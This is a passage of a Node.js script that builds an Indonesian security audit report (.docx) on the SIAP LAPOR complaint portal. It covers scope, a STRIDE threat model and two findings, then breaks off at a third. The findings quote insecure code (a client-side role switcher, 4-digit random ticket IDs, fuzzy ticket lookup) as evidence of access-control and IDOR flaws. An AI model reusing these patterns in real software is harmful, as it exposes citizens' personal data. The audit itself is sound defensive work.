/**
 * Generator Laporan Audit Keamanan SIAP LAPOR Kota Bandar Lampung (.docx)
 * Mahasiswa: Rayhan Pratama (23311140 - SI23DX)
 * Pembimbing: Dr. Erliyan Redy Susanto, M.Kom.
 */

'use strict';
const path = require('path');
const fs = require('fs');

const {
  Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  HeadingLevel, AlignmentType, WidthType, BorderStyle, ShadingType,
  VerticalAlign, PageBreak, Header, Footer, PageNumber, UnderlineType,
  convertInchesToTwip
} = require('./node_modules/docx');

// ─── PALET WARNA (THEME PALETTE) ──────────────────────────────────────────────
const C = {
  primary:     '002548', // Navy Resmi Pemkot Bandar Lampung
  secondary:   '2060A3', // Biru Cerah UTI
  accent:      '0D9488', // Teal
  danger:      '991B1B', // Red 800 (Critical/High)
  dangerBg:    'FEE2E2', // Red 100
  warning:     'D97706', // Amber 600 (Medium)
  warningBg:   'FEF3C7', // Amber 100
  info:        '2563EB', // Blue 600 (Low)
  infoBg:      'DBEAFE', // Blue 100
  success:     '166534', // Green 800 (Passed/Safe)
  successBg:   'DCFCE7', // Green 100
  headerBg:    '002548', // Navy Header Tabel
  headerBgSub: '1E3A8A', // Blue Header Subtabel
  rowAlt:      'F8FAFC', // Slate 50 Zebra
  white:       'FFFFFF',
  borderGray:  'CBD5E1', // Slate 300
  textDark:    '0F172A', // Slate 900
  textMid:     '334155', // Slate 700
  textMuted:   '64748B', // Slate 500
  codeBg:      '0F172A', // Terminal Dark Slate
  codeText:    '38BDF8', // Sky 400
};

// ─── HELPER FUNCTIONS ─────────────────────────────────────────────────────────
function cellBorder(color = C.borderGray, size = 4) {
  const b = { style: BorderStyle.SINGLE, size, color };
  return { top: b, bottom: b, left: b, right: b };
}

function noBorder() {
  const b = { style: BorderStyle.NONE, size: 0, color: 'FFFFFF' };
  return { top: b, bottom: b, left: b, right: b };
}

function para(text, opts = {}) {
  const {
    bold = false, italic = false, size = 21, color = C.textMid,
    alignment = AlignmentType.LEFT, spaceAfter = 100, spaceBefore = 0,
    underline = false, font = 'Calibri'
  } = opts;
  return new Paragraph({
    alignment,
    spacing: { after: spaceAfter, before: spaceBefore, line: 276 },
    children: [
      new TextRun({
        text, bold, italic, size, color, font,
        underline: underline ? { type: UnderlineType.SINGLE } : undefined,
      }),
    ],
  });
}

function paraMulti(runs, opts = {}) {
  const {
    alignment = AlignmentType.LEFT,
    spaceAfter = 100,
    spaceBefore = 0,
    line = 276
  } = opts;
  return new Paragraph({
    alignment,
    spacing: { after: spaceAfter, before: spaceBefore, line },
    children: runs.map(r => new TextRun({
      text: r.text,
      bold: r.bold || false,
      italic: r.italic || false,
      size: r.size || 21,
      color: r.color || C.textMid,
      font: r.font || 'Calibri',
      underline: r.underline ? { type: UnderlineType.SINGLE } : undefined,
    })),
  });
}

function heading1(text) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_1,
    spacing: { after: 180, before: 360 },
    border: { bottom: { style: BorderStyle.SINGLE, size: 8, color: C.primary } },
    children: [
      new TextRun({ text, bold: true, size: 30, color: C.primary, font: 'Calibri' }),
    ],
  });
}

function heading2(text) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_2,
    spacing: { after: 140, before: 240 },
    border: { left: { style: BorderStyle.SINGLE, size: 16, color: C.secondary } },
    indent: { left: 120 },
    children: [
      new TextRun({ text, bold: true, size: 24, color: C.secondary, font: 'Calibri' }),
    ],
  });
}

function heading3(text) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_3,
    spacing: { after: 100, before: 180 },
    children: [
      new TextRun({ text, bold: true, size: 22, color: C.textDark, font: 'Calibri' }),
    ],
  });
}

function bullet(text, level = 0, bold = false) {
  return new Paragraph({
    bullet: { level },
    spacing: { after: 60, line: 260 },
    children: [
      new TextRun({ text, size: 21, color: C.textMid, bold, font: 'Calibri' }),
    ],
  });
}

function bulletRuns(runs, level = 0) {
  return new Paragraph({
    bullet: { level },
    spacing: { after: 60, line: 260 },
    children: runs.map(r => new TextRun({
      text: r.text,
      bold: r.bold || false,
      italic: r.italic || false,
      size: r.size || 21,
      color: r.color || C.textMid,
      font: r.font || 'Calibri',
    })),
  });
}

function codeBlock(lines) {
  return lines.map((line, idx) =>
    new Paragraph({
      spacing: { after: 0, before: idx === 0 ? 80 : 0 },
      shading: { type: ShadingType.SOLID, fill: C.codeBg },
      indent: { left: 160, right: 160 },
      children: [
        new TextRun({
          text: line,
          font: 'Consolas',
          size: 18,
          color: C.codeText,
        }),
      ],
    })
  );
}

function callout(title, text, type = 'warning') {
  const colors = {
    warning: { border: C.warning, bg: C.warningBg, text: '92400E' },
    danger:  { border: C.danger,  bg: C.dangerBg,  text: '991B1B' },
    info:    { border: C.secondary, bg: C.infoBg, text: '1E40AF' },
    success: { border: C.success, bg: C.successBg, text: '166534' }
  };
  const c = colors[type] || colors.info;

  return [
    new Paragraph({
      spacing: { before: 120, after: 60 },
      indent: { left: 200, right: 200 },
      border: { left: { style: BorderStyle.SINGLE, size: 24, color: c.border } },
      shading: { type: ShadingType.SOLID, fill: c.bg },
      children: [
        new TextRun({ text: `[${title.toUpperCase()}] `, bold: true, size: 20, color: c.text, font: 'Calibri' }),
        new TextRun({ text, size: 20, color: c.text, font: 'Calibri' })
      ]
    })
  ];
}

function thCell(text, widthPct, span = 1) {
  return new TableCell({
    columnSpan: span,
    shading: { type: ShadingType.SOLID, fill: C.headerBg },
    borders: cellBorder(C.headerBg, 4),
    verticalAlign: VerticalAlign.CENTER,
    width: { size: widthPct, type: WidthType.PERCENTAGE },
    children: [
      new Paragraph({
        alignment: AlignmentType.CENTER,
        spacing: { after: 60, before: 60 },
        children: [
          new TextRun({ text, bold: true, size: 20, color: C.white, font: 'Calibri' }),
        ],
      }),
    ],
  });
}

function tdCell(text, widthPct, opts = {}) {
  const {
    shading = C.white,
    bold = false,
    color = C.textMid,
    alignment = AlignmentType.LEFT,
    center = false,
    italic = false,
    size = 20,
    span = 1
  } = opts;
  return new TableCell({
    columnSpan: span,
    shading: { type: ShadingType.SOLID, fill: shading },
    borders: cellBorder(C.borderGray, 4),
    verticalAlign: VerticalAlign.CENTER,
    width: { size: widthPct, type: WidthType.PERCENTAGE },
    children: [
      new Paragraph({
        alignment: center ? AlignmentType.CENTER : alignment,
        spacing: { after: 50, before: 50 },
        children: [
          new TextRun({ text, bold, italic, size, color, font: 'Calibri' }),
        ],
      }),
    ],
  });
}

function severityCell(sev, widthPct) {
  const configs = {
    'CRITICAL': { bg: 'FEE2E2', color: '991B1B' },
    'HIGH':     { bg: 'FFEDD5', color: 'C2410C' },
    'MEDIUM':   { bg: 'FEF3C7', color: 'D97706' },
    'LOW':      { bg: 'DBEAFE', color: '1D4ED8' },
    'INFO':     { bg: 'F1F5F9', color: '475569' }
  };
  const cfg = configs[sev] || configs.INFO;
  return new TableCell({
    shading: { type: ShadingType.SOLID, fill: cfg.bg },
    borders: cellBorder(C.borderGray, 4),
    verticalAlign: VerticalAlign.CENTER,
    width: { size: widthPct, type: WidthType.PERCENTAGE },
    children: [
      new Paragraph({
        alignment: AlignmentType.CENTER,
        spacing: { after: 50, before: 50 },
        children: [
          new TextRun({ text: sev, bold: true, size: 20, color: cfg.color, font: 'Calibri' }),
        ],
      }),
    ],
  });
}

// ─── COVER PAGE ───────────────────────────────────────────────────────────────
function buildCoverPage() {
  return [
    para('PEMERINTAH KOTA BANDAR LAMPUNG', {
      bold: true, size: 24, color: C.primary, alignment: AlignmentType.CENTER, spaceAfter: 40
    }),
    para('UNIVERSITAS TEKNOKRAT INDONESIA', {
      bold: true, size: 26, color: C.secondary, alignment: AlignmentType.CENTER, spaceAfter: 60
    }),
    para('FAKULTAS TEKNIK DAN ILMU KOMPUTER — PROGRAM STUDI SISTEM INFORMASI', {
      bold: false, size: 19, color: C.textMuted, alignment: AlignmentType.CENTER, spaceAfter: 280
    }),

    new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      borders: cellBorder(C.secondary, 12),
      rows: [
        new TableRow({
          children: [
            new TableCell({
              shading: { type: ShadingType.SOLID, fill: C.primary },
              borders: cellBorder(C.secondary, 12),
              children: [
                new Paragraph({
                  alignment: AlignmentType.CENTER,
                  spacing: { before: 240, after: 120 },
                  children: [
                    new TextRun({
                      text: 'LAPORAN AUDIT KEAMANAN SISTEM INFORMASI',
                      bold: true, size: 32, color: C.white, font: 'Calibri'
                    })
                  ]
                }),
                new Paragraph({
                  alignment: AlignmentType.CENTER,
                  spacing: { before: 60, after: 180 },
                  children: [
                    new TextRun({
                      text: 'Vulnerability Assessment, Threat Modeling (STRIDE), Evaluasi OWASP Top 10,\nKepatuhan UU PDP No. 27/2022 & Blueprint Remediasi Defensif',
                      size: 22, color: '93C5FD', font: 'Calibri'
                    })
                  ]
                }),
                new Paragraph({
                  alignment: AlignmentType.CENTER,
                  spacing: { before: 60, after: 240 },
                  children: [
                    new TextRun({
                      text: 'Studi Kasus: Sistem Aduan Masyarakat SIAP LAPOR v1.4.0',
                      bold: true, size: 22, color: 'FDE047', font: 'Calibri'
                    })
                  ]
                }),
              ]
            })
          ]
        })
      ]
    }),

    para('', { spaceAfter: 300 }),

    // Info Mahasiswa & Dosen Box
    new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      borders: cellBorder(C.borderGray, 4),
      rows: [
        new TableRow({
          children: [
            thCell('PROFIL PENGUJI & AUDITOR KEAMANAN', 50),
            thCell('DOSEN PENGAMPU & PEMBIMBING', 50),
          ]
        }),
        new TableRow({
          children: [
            new TableCell({
              shading: { type: ShadingType.SOLID, fill: C.white },
              borders: cellBorder(C.borderGray, 4),
              children: [
                paraMulti([
                  { text: 'Nama: ', bold: true, color: C.textDark },
                  { text: 'Rayhan Pratama' }
                ], { spaceAfter: 40 }),
                paraMulti([
                  { text: 'NPM: ', bold: true, color: C.textDark },
                  { text: '23311140' }
                ], { spaceAfter: 40 }),
                paraMulti([
                  { text: 'Kelas: ', bold: true, color: C.textDark },
                  { text: 'SI23DX (Sistem Informasi)' }
                ], { spaceAfter: 40 }),
                paraMulti([
                  { text: 'Institusi: ', bold: true, color: C.textDark },
                  { text: 'Universitas Teknokrat Indonesia' }
                ], { spaceAfter: 40 }),
                paraMulti([
                  { text: 'Fokus Uji: ', bold: true, color: C.textDark },
                  { text: 'Web App Security, Threat Modeling & DB Hardening' }
                ], { spaceAfter: 60 }),
              ]
            }),
            new TableCell({
              shading: { type: ShadingType.SOLID, fill: C.white },
              borders: cellBorder(C.borderGray, 4),
              children: [
                paraMulti([
                  { text: 'Nama Dosen: ', bold: true, color: C.textDark },
                  { text: 'Dr. Erliyan Redy Susanto, M.Kom.' }
                ], { spaceAfter: 40 }),
                paraMulti([
                  { text: 'Mata Kuliah: ', bold: true, color: C.textDark },
                  { text: 'Testing & Debugging Sistem / Rekayasa Perangkat Lunak' }
                ], { spaceAfter: 40 }),
                paraMulti([
                  { text: 'Peran: ', bold: true, color: C.textDark },
                  { text: 'Dosen Pengampu & Verifikator Akademik' }
                ], { spaceAfter: 40 }),
                paraMulti([
                  { text: 'Mitra Sistem: ', bold: true, color: C.textDark },
                  { text: 'Pemerintah Kota Bandar Lampung' }
                ], { spaceAfter: 40 }),
                paraMulti([
                  { text: 'Tanggal Audit: ', bold: true, color: C.textDark },
                  { text: '10 November 2026' }
                ], { spaceAfter: 60 }),
              ]
            }),
          ]
        })
      ]
    }),

    para('', { spaceAfter: 240 }),

    para('BANDAR LAMPUNG — TAHUN AKADEMIK 2026', {
      bold: true, size: 21, color: C.primary, alignment: AlignmentType.CENTER, spaceAfter: 120
    }),

    new Paragraph({ children: [new PageBreak()] })
  ];
}

// ─── RINGKASAN EKSEKUTIF ──────────────────────────────────────────────────────
function buildRingkasanEksekutif() {
  return [
    heading1('RINGKASAN EKSEKUTIF (EXECUTIVE SUMMARY)'),
    
    para(
      'Audit keamanan perangkat lunak ini dilakukan terhadap platform sistem informasi SIAP LAPOR ' +
      'Kota Bandar Lampung (versi 1.4.0), sebuah portal web pelayanan publik yang dirancang untuk ' +
      'menghubungkan aduan masyarakat (jalan rusak, tumpukan sampah liar, penerangan jalan padam, dsb.) ' +
      'dengan Organisasi Perangkat Daerah (OPD) teknis serta Command Center Pemerintah Kota Bandar Lampung.',
      { size: 21, spaceAfter: 120 }
    ),

    para(
      'Tujuan utama dari audit ini adalah mengidentifikasi kerentanan keamanan teknis pada kode sumber (source code), ' +
      'arsitektur state klien, perancangan basis data PostgreSQL, pengelolaan file bukti, serta alur otorisasi ' +
      'berdasarkan kerangka kerja OWASP Top 10:2021, OWASP API Security Top 10:2023, standar SPBE BSSN, ' +
      'serta regulasi Pelindungan Data Pribadi (UU No. 27 Tahun 2022).',
      { size: 21, spaceAfter: 140 }
    ),

    heading2('1. Matriks Rekapitulasi Temuan Keamanan (Severity Breakdown)'),
    
    new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      borders: cellBorder(C.borderGray, 4),
      rows: [
        new TableRow({
          children: [
            thCell('Tingkat Keparahan', 25),
            thCell('Jumlah Temuan', 15),
            thCell('Rentang CVSS v3.1', 20),
            thCell('Status Risiko & Rekomendasi Tindakan', 40),
          ]
        }),
        new TableRow({
          children: [
            severityCell('CRITICAL', 25),
            tdCell('1', 15, { center: true, bold: true, color: C.danger }),
            tdCell('9.0 - 10.0', 20, { center: true }),
            tdCell('Wajib diperbaiki segera sebelum sistem dibuka ke publik internet.', 40, { bold: true }),
          ]
        }),
        new TableRow({
          children: [
            severityCell('HIGH', 25),
            tdCell('4', 15, { center: true, bold: true, color: 'C2410C' }),
            tdCell('7.0 - 8.9', 20, { center: true }),
            tdCell('Harus dimitigasi dalam siklus rilis berikutnya untuk mencegah eksploitasi.', 40),
          ]
        }),
        new TableRow({
          children: [
            severityCell('MEDIUM', 25),
            tdCell('3', 15, { center: true, bold: true, color: C.warning }),
            tdCell('4.0 - 6.9', 20, { center: true }),
            tdCell('Perbaikan pada konfigurasi database, logging kriptografis, dan headers.', 40),
          ]
        }),
        new TableRow({
          children: [
            severityCell('LOW', 25),
            tdCell('1', 15, { center: true, bold: true, color: C.info }),
            tdCell('0.1 - 3.9', 20, { center: true }),
            tdCell('Penguatan mekanisme browser storage quota & penanganan cache.', 40),
          ]
        }),
        new TableRow({
          children: [
            severityCell('INFO', 25),
            tdCell('1', 15, { center: true, bold: true, color: '475569' }),
            tdCell('N/A', 20, { center: true }),
            tdCell('Best-practice rate limiting & throttling pada endpoint publik.', 40),
          ]
        }),
        new TableRow({
          children: [
            tdCell('TOTAL TEMUAN', 25, { bold: true, shading: C.rowAlt }),
            tdCell('10 Kerentanan', 15, { center: true, bold: true, shading: C.rowAlt }),
            tdCell('Rata-rata: 6.8', 20, { center: true, bold: true, shading: C.rowAlt }),
            tdCell('Postur: Rentan Terhadap Manipulasi State & Akses Kontrol Klien', 40, { bold: true, shading: C.rowAlt }),
          ]
        }),
      ]
    }),

    para('', { spaceAfter: 120 }),

    ...callout(
      'RINGKASAN STATUS KESIAPAN KEAMANAN',
      'SIAP LAPOR v1.4 saat ini berstatus prototipe interaktif fungsional dengan keunggulan pada UI/UX dan alur data terstruktur. ' +
      'Namun, dari perspektif pertahanan siber (cyber defense), aplikasi masih sangat rentan karena mengandalkan logika ' +
      'keamanan di sisi browser klien (client-side trust model). Sebelum penerapan nyata (production deployment) di infrastruktur ' +
      'Pemkot Bandar Lampung, 10 poin rekomendasi defensif pada laporan ini wajib diimplementasikan.',
      'danger'
    ),

    new Paragraph({ children: [new PageBreak()] })
  ];
}

// ─── BAB I: PENDAHULUAN & RUANG LINGKUP ────────────────────────────────────────
function buildBab1_Pendahuluan() {
  return [
    heading1('BAB I: PENDAHULUAN & RUANG LINGKUP AUDIT'),

    heading2('1.1 Latar Belakang'),
    para(
      'Sistem Pemerintahan Berbasis Elektronik (SPBE) menuntut instansi pemerintah daerah untuk ' +
      'menyediakan layanan publik yang cepat, transparan, dan akuntabel. Aplikasi SIAP LAPOR Kota Bandar ' +
      'Lampung hadir sebagai kanal digital terpadu penanganan keluhan infrastruktur dan layanan kota. ' +
      'Namun, aplikasi pelayanan publik yang mengelola data pribadi kependudukan (seperti NIK, nama lengkap, ' +
      'nomor kontak, dan data spasial titik keluhan) memiliki risiko tinggi menjadi target kejahatan siber, ' +
      'mulai dari pencurian identitas warga (identity theft), manipulasi dokumen perintah tugas (SPT), ' +
      'hingga serangan pengambilalihan sistem portal administrasi.',
      { spaceAfter: 120 }
    ),

    heading2('1.2 Tujuan dan Sasaran Audit'),
    para('Audit keamanan ini dilaksanakan dengan tujuan spesifik sebagai berikut:'),
    bullet('Mengidentifikasi seluruh kelemahan keamanan (vulnerabilities) pada kode sumber TypeScript/React dan skema PostgreSQL.', 0, false),
    bullet('Menganalisis potensi ancaman melalui pemodelan ancaman (threat modeling) menggunakan metode STRIDE.', 0, false),
    bullet('Mengevaluasi kesesuaian arsitektur aplikasi terhadap standar industri OWASP Top 10:2021 dan OWASP API Security Top 10:2023.', 0, false),
    bullet('Menilai tingkat kepatuhan perlindungan data warga negara terhadap UU No. 27 Tahun 2022 tentang Pelindungan Data Pribadi (UU PDP).', 0, false),
    bullet('Menyusun blueprint remediasi teknis defensif berupa kode perbaikan, skrip migrasi SQL, dan konfigurasi hardening yang dapat langsung diterapkan.', 0, false),

    heading2('1.3 Ruang Lingkup Pengujian (Scope of Assessment)'),
    new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      borders: cellBorder(C.borderGray, 4),
      rows: [
        new TableRow({
          children: [
            thCell('Komponen / Aset', 25),
            thCell('Target File & Jalur', 40),
            thCell('Cakupan Pengujian Keamanan', 35),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Frontend User Interface', 25, { bold: true }),
            tdCell('src/components/pages/*\nsrc/components/common/*', 40),
            tdCell('XSS, sanitasi input, manipulasi DOM, validasi unggahan file foto bukti.', 35),
          ]
        }),
        new TableRow({
          children: [
            tdCell('State & Otorisasi Klien', 25, { bold: true }),
            tdCell('src/context/AppContext.tsx\nsrc/components/common/RoleSwitcher.tsx', 40),
            tdCell('Broken access control, trust boundary violations, persistensi localStorage.', 35),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Database & Storage Skema', 25, { bold: true }),
            tdCell('database/schema.sql\ndatabase/seed.sql', 40),
            tdCell('Enkripsi data at-rest, manajemen PII NIK/HP, Row Level Security (RLS), integritas relasional.', 35),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Integrasi & Pelacakan Publik', 25, { bold: true }),
            tdCell('src/components/common/TrackTicketModal.tsx\nsrc/data/mockData.ts', 40),
            tdCell('Insecure Direct Object Reference (IDOR), prediktabilitas token tiket, information disclosure.', 35),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Infrastruktur Deployment', 25, { bold: true }),
            tdCell('vercel.json\nindex.html\npackage.json', 40),
            tdCell('HTTP security headers (CSP, HSTS, X-Frame-Options), routing rewrites, dependensi audit.', 35),
          ]
        }),
      ]
    }),

    para('', { spaceAfter: 140 }),

    heading2('1.4 Landasan Regulasi dan Standar Keamanan'),
    bulletRuns([
      { text: '1. UU No. 27 Tahun 2022 tentang Pelindungan Data Pribadi (UU PDP): ', bold: true },
      { text: 'Pasal 35 & 39 mewajibkan pengendali data pribadi melindungi data pribadi dari pemrosesan tidak sah dengan enkripsi teknis dan tata kelola yang memadai.' }
    ]),
    bulletRuns([
      { text: '2. OWASP Top 10 Web Application Security Risks (2021): ', bold: true },
      { text: 'Standar de facto penilaian kerentanan aplikasi web teratas dunia (A01 s/d A10).' }
    ]),
    bulletRuns([
      { text: '3. Perpres No. 95 Tahun 2018 tentang SPBE & Panduan Teknis BSSN: ', bold: true },
      { text: 'Pedoman standar keamanan informasi instansi pemerintah mencakup aspek kerahasiaan, keutuhan, dan ketersediaan.' }
    ]),
    bulletRuns([
      { text: '4. NIST SP 800-115 (Technical Guide to Information Security Testing and Assessment): ', bold: true },
      { text: 'Metodologi audit kode sumber dan pemetaan risiko sistem informasi.' }
    ]),

    new Paragraph({ children: [new PageBreak()] })
  ];
}

// ─── BAB II: METODOLOGI & THREAT MODELING ─────────────────────────────────────
function buildBab2_MetodologiThreatModeling() {
  return [
    heading1('BAB II: METODOLOGI & THREAT MODELING (STRIDE)'),

    heading2('2.1 Metodologi Audit Keamanan'),
    para(
      'Audit keamanan pada SIAP LAPOR dilakukan dengan pendekatan White-Box Security Assessment ' +
      'dan Static Application Security Testing (SAST). Auditor memiliki akses menyeluruh terhadap repositori, ' +
      'arsitektur sistem, kode frontend React TypeScript, skema SQL, serta alur data state.',
      { spaceAfter: 100 }
    ),

    heading2('2.2 Analisis Ancaman Berdasarkan Model STRIDE'),
    para('Model ancaman STRIDE digunakan untuk memetakan risiko pada setiap batas kepercayaan (trust boundary) sistem:'),

    new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      borders: cellBorder(C.borderGray, 4),
      rows: [
        new TableRow({
          children: [
            thCell('Kategori STRIDE', 22),
            thCell('Potensi Ancaman pada SIAP LAPOR', 40),
            thCell('Tingkat Risiko & Dampak', 38),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Spoofing (Penyamaran)', 22, { bold: true }),
            tdCell('Pengguna dapat berpura-pura menjadi warga ber-NIK terverifikasi atau menjadi Admin Command Center melalui komponen RoleSwitcher.', 40),
            tdCell('Tinggi: Pengambilalihan wewenang disposisi SPT dan akses data investigasi.', 38, { color: C.danger, bold: true }),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Tampering (Manipulasi)', 22, { bold: true }),
            tdCell('Foto bukti laporan dapat diinjeksi dengan koordinat GPS palsu tanpa verifikasi EXIF asli di backend. Status laporan dapat diubah di browser.', 40),
            tdCell('Tinggi: Penyusupan laporan fiktif (hoaks) dan pemalsuan progres kerja lapangan.', 38, { color: C.danger, bold: true }),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Repudiation (Penyangkalan)', 22, { bold: true }),
            tdCell('Activity logs menggunakan hash acak (Math.random) alih-alih HMAC kriptografis, sehingga rekam jejak tidak memiliki nilai pembuktian hukum.', 40),
            tdCell('Sedang: Petugas atau admin dapat menyangkal tindakan penghapusan/penolakan tiket.', 38, { color: C.warning, bold: true }),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Information Disclosure (Kebocoran Data)', 22, { bold: true }),
            tdCell('Nomor tiket mudah ditebak (4-digit acak) dan modal pelacakan menampilkan data pelapor serta alamat secara fuzzy tanpa autentikasi.', 40),
            tdCell('Sangat Tinggi: Kebocoran identitas dan riwayat aduan warga kota.', 38, { color: C.danger, bold: true }),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Denial of Service (Penyangkalan Layanan)', 22, { bold: true }),
            tdCell('Penyimpanan bukti foto base64 secara bebas di localStorage menyebabkan browser crash (QUOTA_EXCEEDED_ERR). Tidak ada rate limiting.', 40),
            tdCell('Sedang: Crash aplikasi di sisi browser klien dan spamming aduan palsu.', 38, { color: C.warning, bold: true }),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Elevation of Privilege (Eskalasi Hak)', 22, { bold: true }),
            tdCell('Ketiadaan session server-side memungkinkan pengguna publik menaikkan hak akses menjadi Admin Verifikator hanya dengan memilih menu switch peran.', 40),
            tdCell('Kritis: Kontrol penuh atas seluruh data pengaduan kota.', 38, { color: C.danger, bold: true }),
          ]
        }),
      ]
    }),

    para('', { spaceAfter: 140 }),

    heading2('2.3 Standar Penilaian Risiko CVSS v3.1'),
    para(
      'Setiap temuan kerentanan dihitung nilainya berdasarkan kalkulator CVSS v3.1 ' +
      '(Common Vulnerability Scoring System) yang mencakup Attack Vector (AV), Attack Complexity (AC), ' +
      'Privileges Required (PR), User Interaction (UI), Scope (S), Confidentiality (C), ' +
      'Integrity (I), dan Availability (A).',
      { spaceAfter: 120 }
    ),

    new Paragraph({ children: [new PageBreak()] })
  ];
}

// ─── BAB III: TEMUAN DETAIL KERENTANAN ─────────────────────────────────────────
function buildBab3_TemuanKerentanan() {
  const sections = [];

  sections.push(
    heading1('BAB III: TEMUAN DETAIL AUDIT KEAMANAN (SECURITY FINDINGS)'),
    para(
      'Bab ini menyajikan rincian teknis 10 kerentanan yang teridentifikasi selama proses security audit, ' +
      'dilengkapi dengan bukti analisis kode sumber, penilaian keparahan CVSS v3.1, dampak risiko, ' +
      'serta rekomendasi mitigasi defensif.',
      { spaceAfter: 160 }
    )
  );

  // TEMUAN 1
  sections.push(
    heading2('Temuan 1: SEC-VULN-01 [CRITICAL] Broken Access Control & Information Exposure via Client State'),
    new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      borders: cellBorder(C.borderGray, 4),
      rows: [
        new TableRow({
          children: [
            thCell('Atribut Kerentanan', 30),
            thCell('Detail Analisis', 70),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Klasifikasi', 30, { bold: true }),
            tdCell('CWE-285: Improper Authorization / OWASP A01:2021 – Broken Access Control', 70),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Skor & Vektor CVSS v3.1', 30, { bold: true }),
            tdCell('9.1 (CRITICAL) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N', 70, { bold: true, color: C.danger }),
          ]
        }),
        new TableRow({
          children: [
            tdCell('File / Komponen Terdampak', 30, { bold: true }),
            tdCell('src/context/AppContext.tsx (baris 38-53), src/components/common/RoleSwitcher.tsx', 70),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Ringkasan Kelemahan', 30, { bold: true }),
            tdCell('Seluruh data laporan (termasuk identitas pelapor, nomor telepon, dan status investigasi admin) dimuat langsung ke state React di browser klien tanpa token otentikasi server-side. Menu RoleSwitcher memungkinkan siapa saja berpindah peran menjadi Admin atau Petugas secara sepihak.', 70),
          ]
        }),
      ]
    }),
    para('', { spaceAfter: 80 }),
    paraMulti([
      { text: 'Bukti Kode Sumber (src/components/common/RoleSwitcher.tsx):', bold: true, color: C.textDark }
    ]),
    ...codeBlock([
      '// Siapa saja di browser dapat mengklik tombol ini dan langsung mengakses Command Center Admin',
      '<button onClick={() => setActivePage("admin-dashboard")}>',
      '  <LayoutDashboard /> <span>Command Center</span> [Role: Admin]',
      '</button>',
      '<button onClick={() => setActivePage("admin-verification")}>',
      '  <ShieldCheck /> <span>Verifikasi & SPT</span> [Role: Admin]',
      '</button>'
    ]),
    para('', { spaceAfter: 80 }),
    paraMulti([
      { text: 'Dampak Kerentanan: ', bold: true, color: C.danger },
      { text: 'Pengunjung tanpa hak otentikasi dapat memverifikasi, mendisposisikan SPT palsu, atau menolak laporan masyarakat secara sepihak di memori lokal atau sesi tersimpan. Kerahasiaan data investigasi dan perintah tugas ASN menjadi nihil.' }
    ], { spaceAfter: 80 }),
    paraMulti([
      { text: 'Rekomendasi Remediasi Defensif: ', bold: true, color: C.success },
      { text: 'Wajib menerapkan Server-Side Authentication menggunakan JWT (JSON Web Token) yang disimpan dalam HttpOnly, Secure, SameSite Cookie. Komponen RoleSwitcher harus diisolasi khusus untuk mode development dan dilarang dikompilasi pada build production.' }
    ], { spaceAfter: 160 })
  );

  // TEMUAN 2
  sections.push(
    heading2('Temuan 2: SEC-VULN-02 [HIGH] Insecure Direct Object Reference (IDOR) & Prediktabilitas Nomor Tiket'),
    new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      borders: cellBorder(C.borderGray, 4),
      rows: [
        new TableRow({
          children: [
            thCell('Atribut Kerentanan', 30),
            thCell('Detail Analisis', 70),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Klasifikasi', 30, { bold: true }),
            tdCell('CWE-639: Authorization Bypass Through User-Controlled Key / OWASP API1:2023 – Broken Object Level Authorization', 70),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Skor & Vektor CVSS v3.1', 30, { bold: true }),
            tdCell('8.2 (HIGH) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N', 70, { bold: true, color: 'C2410C' }),
          ]
        }),
        new TableRow({
          children: [
            tdCell('File / Komponen Terdampak', 30, { bold: true }),
            tdCell('src/context/AppContext.tsx (baris 90-93), src/components/common/TrackTicketModal.tsx (baris 20-25)', 70),
          ]
        }),
      ]
    }),
    para('', { spaceAfter: 80 }),
    paraMulti([
      { text: 'Bukti Kode Sumber (src/context/AppContext.tsx & TrackTicketModal.tsx):', bold: true, color: C.textDark }
    ]),
    ...codeBlock([
      '// 1. Generator tiket hanya menghasilkan 4 digit acak (1000 - 9999):',
      'const nextNum = Math.floor(1000 + Math.random() * 9000);',
      'const newPublicTicket = `TKT-BDL-2026-${nextNum}`; // Ruang entropi sangat sempit (hanya 9.000 kemungkinan)',
      '',
      '// 2. Pada modal pelacakan, pencarian substring fuzzy mencocokkan laporan siapapun:',
      'const report = reports.find(r => r.id.includes(currentQuery) || (currentQuery.length > 2 && r.id.includes(currentQuery)));'
    ]),
    para('', { spaceAfter: 80 }),
    paraMulti([
      { text: 'Dampak Kerentanan: ', bold: true, color: C.danger },
      { text: 'Penyerang dapat dengan mudah melakukan brute-force enumeration terhadap 9.000 kemungkinan tiket. Terlebih lagi, memasukkan hanya 3 huruf seperti "BDL" atau "2026" langsung mengekspos tiket dan data pelapor warga lain.' }
    ], { spaceAfter: 80 }),
    paraMulti([
      { text: 'Rekomendasi Remediasi Defensif: ', bold: true, color: C.success },
      { text: 'Gunakan UUIDv4 kriptografis atau token nano-id bertaraf kriptografis (minimal 128-bit entropi). Pada endpoint pelacakan, lakukan perbandingan nilai eksak (strict equality check) dan batasi informasi yang ditampilkan ke publik tanpa menyertakan nomor HP dan data personal pelapor.' }
    ], { spaceAfter: 160 })
  );

  // TEMUAN 3
  sections.push(
